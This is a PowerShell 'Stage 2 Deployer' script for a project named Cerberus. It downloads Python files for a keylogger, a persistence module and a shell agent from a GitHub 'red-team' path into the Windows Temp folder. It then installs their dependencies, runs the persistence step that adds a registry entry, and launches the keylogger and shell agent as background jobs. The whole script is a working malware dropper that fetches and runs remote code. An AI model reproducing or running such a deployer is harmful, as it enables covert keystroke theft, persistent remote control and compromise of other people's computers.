# Project Cerberus - Stage 2 Deployer (DEBUG VERSION)

$dir  = "C:\Windows\Temp\cerberus"
$base = "https://raw.githubusercontent.com/pavelyoav-eng/-Project-Cerberus/refs/heads/master/red-team/keylogger"
$log  = "C:\Windows\Temp\cerberus_deploy.log"

function Log($msg) {
    $line = "[$(Get-Date -Format 'HH:mm:ss')] $msg"
    Write-Host $line -ForegroundColor Cyan
    $line | Out-File $log -Append
}

Log "Deploy started"

New-Item -ItemType Directory -Force -Path $dir | Out-Null
Log "Directory ready: $dir"

$files = @("config.py", "keylogger.py", "persistence.py", "shell_agent.py", "requirements.txt")
foreach ($f in $files) {
    Invoke-WebRequest -Uri "$base/$f" -OutFile "$dir\$f"
    Log "Downloaded: $f"
}

Log "Running pip install..."
pip install -r "$dir\requirements.txt"
Log "pip install done"

Log "Running persistence.py..."
python "$dir\persistence.py"
Log "persistence.py done (registry entry added)"

Log "Launching shell_agent.py and keylogger.py..."

$job1 = Start-Job -ScriptBlock { python "C:\Windows\Temp\cerberus\shell_agent.py" }
$job2 = Start-Job -ScriptBlock { python "C:\Windows\Temp\cerberus\keylogger.py" }

Log "Both agents running. Streaming output below..."
Write-Host "----------------------------------------" -ForegroundColor Yellow
Write-Host "  SHELL AGENT + KEYLOGGER LIVE OUTPUT   " -ForegroundColor Yellow
Write-Host "  (close this window to stop both)      " -ForegroundColor Yellow
Write-Host "----------------------------------------" -ForegroundColor Yellow

while ($true) {
    $out1 = Receive-Job $job1
    $out2 = Receive-Job $job2

    if ($out1) { Write-Host "[shell_agent] $out1" -ForegroundColor Green }
    if ($out2) { Write-Host "[keylogger]   $out2" -ForegroundColor Magenta }

    # If either job crashed, report it
    if ($job1.State -eq "Failed") { Write-Host "[!] shell_agent crashed!" -ForegroundColor Red; break }
    if ($job2.State -eq "Failed") { Write-Host "[!] keylogger crashed!"   -ForegroundColor Red; break }

    Start-Sleep -Milliseconds 500
}